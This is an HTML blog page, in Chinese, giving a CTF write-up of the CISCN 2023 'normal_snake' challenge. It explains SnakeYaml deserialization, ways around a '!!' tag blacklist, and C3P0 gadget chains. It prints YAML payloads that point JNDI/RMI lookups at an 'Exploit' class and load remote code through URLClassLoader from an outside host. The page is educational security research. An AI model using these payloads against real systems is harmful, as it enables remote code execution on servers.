@@ -1,0 +1,779 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="EddieMurphy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言看标题就知道这次我要写什么，就是缝合怪。 除了Hessian这种独特的反序列化机制，以及AliyunChain17这种，很多java反序列化题目都是缝合。再加上搞心态的黑名单，缝合属性大爆发了属于是。 话不多说直接看题。 题目分析这道题我在博客园发过一次分析，这里也就浅浅贴个链接CV几下偷个懒~~ [CISCN 2023 华北]-normal_snake - Eddie_Murphy - 博客">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从CISCN2023-华北-normal_snake看Snakeyaml和C3P0缝合">
+<meta property="og:url" content="https://eddiemurphy89.github.io/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/index.html">
+<meta property="og:site_name" content="EddieMurphy&#39;s blog">
+<meta property="og:description" content="前言看标题就知道这次我要写什么，就是缝合怪。 除了Hessian这种独特的反序列化机制，以及AliyunChain17这种，很多java反序列化题目都是缝合。再加上搞心态的黑名单，缝合属性大爆发了属于是。 话不多说直接看题。 题目分析这道题我在博客园发过一次分析，这里也就浅浅贴个链接CV几下偷个懒~~ [CISCN 2023 华北]-normal_snake - Eddie_Murphy - 博客">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805005147709.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426154915617-2053435429.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426155154019-1122902148.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426155341849-1964878351.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426155602116-239237126.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426155743984-1909246964.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805003817800.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004855145.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004832508.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004825368.png">
+<meta property="article:published_time" content="2024-08-04T16:16:04.000Z">
+<meta property="article:modified_time" content="2024-08-04T16:54:42.635Z">
+<meta property="article:author" content="EddieMurphy">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805005147709.png">
+  
+  
+  
+  <title>从CISCN2023-华北-normal_snake看Snakeyaml和C3P0缝合 - EddieMurphy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"eddiemurphy89.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>EddieMurphy&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/chainsaw_man.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="从CISCN2023-华北-normal_snake看Snakeyaml和C3P0缝合"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-05 00:16" pubdate>
+          2024年8月5日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">从CISCN2023-华北-normal_snake看Snakeyaml和C3P0缝合</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看标题就知道这次我要写什么，就是缝合怪。</p>
+<p>除了Hessian这种独特的反序列化机制，以及AliyunChain17这种，很多java反序列化题目都是缝合。再加上搞心态的黑名单，缝合属性大爆发了属于是。</p>
+<p>话不多说直接看题。</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这道题我在博客园发过一次分析，这里也就浅浅贴个链接CV几下偷个懒~~</p>
+<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/18160178">CISCN 2023 华北]-normal_snake - Eddie_Murphy - 博客园 (cnblogs.com)</a></p>
+<p>&#x2F;read路由下传参data，pyload不能包含!!，然后用了yaml来load传入的参数。</p>
+<p>稍作了解，这其实就是 SnakeYaml 反序列化漏洞，禁用了 yaml 的常用头 <code>!!</code>。</p>
+<p>前面的<code>!!</code>是用于强制类型转化，强制转换为<code>!!</code>后指定的类型，其实这个和Fastjson的<code>@type</code>有着异曲同工之妙。用于指定反序列化的全类名。</p>
+<p>但用tag头可以绕过：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/2i6Q9Ob7n0cSxuj9Rob8Uw">微信公众平台 (qq.com)</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">!&lt;tag:yaml.org,<span class="hljs-number">2002</span>:com.sun.rowset.JdbcRowSetImpl&gt;\n dataSourceName: \<span class="hljs-string">&quot;rmi://localhost:1234/Exploit\&quot;\n autoCommit: true</span><br><span class="hljs-string">    </span><br><span class="hljs-string">!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \&quot;rmi://localhost:1234/Exploit\&quot;\n autoCommit: true</span><br></code></pre></td></tr></table></figure>
+
+<p>或者这样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">%TAG !      tag:yaml.org,<span class="hljs-number">2002</span>:<br>---<br>!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL [<span class="hljs-string">&quot;http://b1ue.cn/&quot;</span>]]]]<br></code></pre></td></tr></table></figure>
+
+<p>而 <code>SafeConstructorWithException</code> 中过滤了常见的 <code>payload</code> 关键字，HEX 编码部分禁用了 <code>BadAttributeValueExpException</code> 和 <code>HotSwappableTargetSource</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkForExceptions</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RuntimeException, RuntimeException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">upperCaseData</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.data.toUpperCase();<br>    <span class="hljs-keyword">if</span> (!upperCaseData.contains(<span class="hljs-string">&quot;JAVA&quot;</span>) &amp;&amp; !upperCaseData.contains(<span class="hljs-string">&quot;JNDI&quot;</span>) &amp;&amp; !upperCaseData.contains(<span class="hljs-string">&quot;JDBC&quot;</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (upperCaseData.contains(<span class="hljs-string">&quot;42616441747472696275746556616C7565457870457863657074696F6E&quot;</span>) || upperCaseData.contains(<span class="hljs-string">&quot;486F74537761707061626C65546172676574536F75726365&quot;</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;No way to pass!&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Unsafe data detected!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>看一下pom.xml：</p>
+<p><img src="/2024/07/28/Commons-Collections/-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805005147709.png" srcset="/img/loading.gif" lazyload alt="image-20240805005147709"></p>
+<p>给了c3p0依赖，估计是从这里入手：</p>
+<p>在C3P0中有三种利用方式:</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">http <span class="hljs-keyword">base</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JNDI</span><br><span class="hljs-keyword"></span>HEX序列化字节加载器<br></code></pre></td></tr></table></figure>
+
+<p>在原生的反序列化中如果找不到其他链，则可尝试C3P0去加载远程的类进行命令执行。JNDI则适用于Jackson等利用。而HEX序列化字节加载器的方式可以利用与fj和Jackson等不出网情况下打入内存马使用。</p>
+<p>抄一下：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BUTLER/p/17473487.html">2023 华北分区赛 normal_snake - B0T1eR - 博客园 (cnblogs.com)</a></p>
+<p>C3P0 主要有以下利用链：</p>
+<table>
+<thead>
+<tr>
+<th align="left">触发点</th>
+<th align="left">功效</th>
+<th align="left">适用性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">JndiRefForwardingDataSource#setLoginTimeout – InitialContext#lookup</td>
+<td align="left">Jndi 注入</td>
+<td align="left">fastjson&#x2F;snakeyaml&#x2F;jackson</td>
+</tr>
+<tr>
+<td align="left">WrapperConnectionPoolDataSource#setUserOverridesAsString – ObjectInputStream#readObject</td>
+<td align="left">Hex 解码后触发原生反序列化</td>
+<td align="left">fastjson&#x2F;snakeyaml&#x2F;jackson</td>
+</tr>
+<tr>
+<td align="left">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject – IndirectlySerialized#getObject() – InitialContext#lookup</td>
+<td align="left">Jndi 注入</td>
+<td align="left">Java原生反序列化</td>
+</tr>
+<tr>
+<td align="left">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject – IndirectlySerialized#getObject() – com.mchange.v2.naming.ReferenceableUtils#referenceToObject – URLClassLoader</td>
+<td align="left">URLCLassLoader 远程类加载</td>
+<td align="left">Java原生反序列化</td>
+</tr>
+<tr>
+<td align="left">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject – IndirectlySerialized#getObject() – com.mchange.v2.naming.ReferenceableUtils#referenceToObject – BeanFactory#getInstance</td>
+<td align="left">不出网的命令注入</td>
+<td align="left">Java原生反序列化不出网</td>
+</tr>
+</tbody></table>
+<p>在不考虑题目黑名单的情况下，这里浅浅了解了一下C3P0的几种打法：</p>
+<h3 id="JndiRefForwardingDataSource：Jndi-注入"><a href="#JndiRefForwardingDataSource：Jndi-注入" class="headerlink" title="JndiRefForwardingDataSource：Jndi 注入"></a>JndiRefForwardingDataSource：Jndi 注入</h3><p>没错，又是老常客了，JNDI注入。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.JndiRefForwardingDataSource#setLoginTimeout(<span class="hljs-type">int</span> seconds) 可以触发 jndi 注入<br></code></pre></td></tr></table></figure>
+
+<p>poc链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.JndiRefForwardingDataSource#setLoginTimeout(<span class="hljs-type">int</span> seconds)<br> -com.mchange.v2.c3p0.JndiRefForwardingDataSource#inner()<br>   -com.mchange.v2.c3p0.JndiRefForwardingDataSource#dereference()<br>     -InitialContext#lookup()<br></code></pre></td></tr></table></figure>
+
+<p>而SnakeYaml 可以触发该 setter 方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">poc_snakeyaml</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n jndiName: \&quot;rmi://127.0.0.1:1234/Exploit\&quot;\n loginTimeout: 0&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<h3 id="WrapperConnectionPoolDataSource：Hex-二次反序列化"><a href="#WrapperConnectionPoolDataSource：Hex-二次反序列化" class="headerlink" title="WrapperConnectionPoolDataSource：Hex 二次反序列化"></a>WrapperConnectionPoolDataSource：Hex 二次反序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource &#123;userOverridesAsString: \&quot;HexAsciiSerializedMap:&quot;</span> +hexAscii+ <span class="hljs-string">&quot;;\&quot;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>为什么 SnakeYaml 可以触发 Hex 二次反序列化这条链子？</p>
+<p>首先 SnakeYaml 在反序列化的时候会根据 yaml 中的类属性描述进行相关 setter 方法并调用：</p>
+<p>WrapperConnectionPoolDataSourceBase 是 WrapperConnectionPoolDataSource的父类，而<code>com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase#setUserOverridesAsString</code>在 snakeyaml 反序列化的时候会被调用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserOverridesAsString</span><span class="hljs-params">( String userOverridesAsString )</span> <span class="hljs-keyword">throws</span> PropertyVetoException<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">oldVal</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.userOverridesAsString;<br>    <span class="hljs-keyword">if</span> ( ! eqOrBothNull( oldVal, userOverridesAsString ) )<br>        vcs.fireVetoableChange( <span class="hljs-string">&quot;userOverridesAsString&quot;</span>, oldVal, userOverridesAsString );<br>    <span class="hljs-built_in">this</span>.userOverridesAsString = userOverridesAsString;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>经过一系列调用栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">java.beans.VetoableChangeSupport#fireVetoableChange(String propertyName, Object oldValue, Object newValue)<br>    -java.beans.VetoableChangeSupport#fireVetoableChange(PropertyChangeEvent event)<br>      -java.beans.VetoableChangeListener#vetoableChange()<br>        -C3P0ImplUtils#parseUserOverridesAsString()<br>          -com.mchange.v2.ser.SerializableUtils#fromByteArray(<span class="hljs-type">byte</span>[] bytes)<br>            -com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray(<span class="hljs-type">byte</span>[] bytes)<br></code></pre></td></tr></table></figure>
+
+<p><code>C3P0ImplUtils#parseUserOverridesAsString</code>方法：从形参处截取掉HASM_HEADER：<code>HexAsciiSerializedMap</code>字符串然后进行hex解码为字节数组：</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426154915617-2053435429.png"><img src="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426154915617-2053435429.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>下一个栈调用<code>com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray(byte[] bytes)</code>处理字节数组调用原生反序列化：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserializeFromByteArray</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>    <span class="hljs-keyword">return</span> in.readObject();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObject：jndi-注入"><a href="#com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObject：jndi-注入" class="headerlink" title="com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject：jndi 注入"></a>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject：jndi 注入</h3><p>如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()<br>  -IndirectlySerialized#getObject()<br>  -com.mchange.v2.naming.ReferenceIndirector#getObject()<br>    -InitialContext#lookup()<br></code></pre></td></tr></table></figure>
+
+<p><code>com.mchange.v2.naming.ReferenceIndirector#getObject()</code> 内部可以触发 JNDI 注入：</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426155154019-1122902148.png"><img src="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426155154019-1122902148.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>看到lookup基本就有谱了。</p>
+<h3 id="com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObject：远程类加载"><a href="#com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObject：远程类加载" class="headerlink" title="com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject：远程类加载"></a>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject：远程类加载</h3><p>利用链可参考ysoserial：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()<br>  -IndirectlySerialized#getObject()<br>  -com.mchange.v2.naming.ReferenceIndirector#getObject()<br>    -com.mchange.v2.naming.ReferenceableUtils#referenceToObject(Reference ref,Name name,Context nameCtx,Hashtable env)<br>     -URLClassLoader<br></code></pre></td></tr></table></figure>
+
+<p>对于最后一步<code>com.mchange.v2.naming.ReferenceableUtils#referenceToObject(Reference ref,Name name,Context nameCtx,Hashtable env)</code></p>
+<p>这里会获取通过 URLClassLoader 来加载远程的类并进行初始化和 getObjectInstance 方法的调用，</p>
+<p>因此可以直接在静态块里面放入恶意数据进行RCE：</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426155341849-1964878351.png"><img src="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426155341849-1964878351.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>对于前面一个jndi也有的PoolBackedDataSourceBase，这里一并讲了。</p>
+<p>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()：</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426155602116-239237126.png"><img src="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426155602116-239237126.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>红框中的 <code>ois.readObject()</code> 获取的是 IndirectlySerialized 对象，IndirectlySerialized 是一个接口，其的唯一子类是 ReferenceSerialized，</p>
+<p>但是 ReferenceSerialized 是 ReferenceIndirector 类内部的私有类，该类不能进行初始化操作。</p>
+<p>所以我们现在要看 writeObject 是如何将 ReferenceSerialized 写入到序列化流中的。</p>
+<p>从序列化角度来看：</p>
+<p><code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#writeObject()</code> 中，</p>
+<p>如果序列化的类是不可序列化的话(NotSerializableException)，将会在 catch 块中对 connectionPoolDataSource 属性用 ReferenceIndirector.indirectForm 方法处理后再进行序列化操作。(connectionPoolDataSource 属性是 ConnectionPoolDataSource 类的实例)</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426155743984-1909246964.png"><img src="https://img2024.cnblogs.com/blog/3259464/202404/3259464-20240426155743984-1909246964.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><code>ReferenceIndirector.indirectForm</code> 方法中会取出参数 ConnectionPoolDataSource 实例中的 Reference 对象并构造出可序列化的 <code>ReferenceSerialized</code> 对象并返回：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> IndirectlySerialized <span class="hljs-title function_">indirectForm</span><span class="hljs-params">( Object orig )</span> <span class="hljs-keyword">throws</span> Exception<br>&#123; <br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> ((Referenceable) orig).getReference();<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceSerialized</span>( ref, name, contextName, environmentProperties );<br>&#125;<br>ReferenceSerialized( Reference   reference,<br>                    Name        name,<br>                    Name        contextName,<br>                    Hashtable   env )<br>&#123;<br>    <span class="hljs-built_in">this</span>.reference = reference;<br>    <span class="hljs-built_in">this</span>.name = name;<br>    <span class="hljs-built_in">this</span>.contextName = contextName;<br>    <span class="hljs-built_in">this</span>.env = env;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>所以我们就需要序列化一个没有实现 Serializable 接口的 ConnectionPoolDataSource 的实例才能将 IndirectlySerialized 写入到序列化流中。</strong></p>
+<p>ConnectionPoolDataSource 接口有俩个子类，不过遗憾的是它们俩都可以被序列化：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">WrapperConnectionPoolDataSource<br>JndiRefConnectionPoolDataSource<br></code></pre></td></tr></table></figure>
+
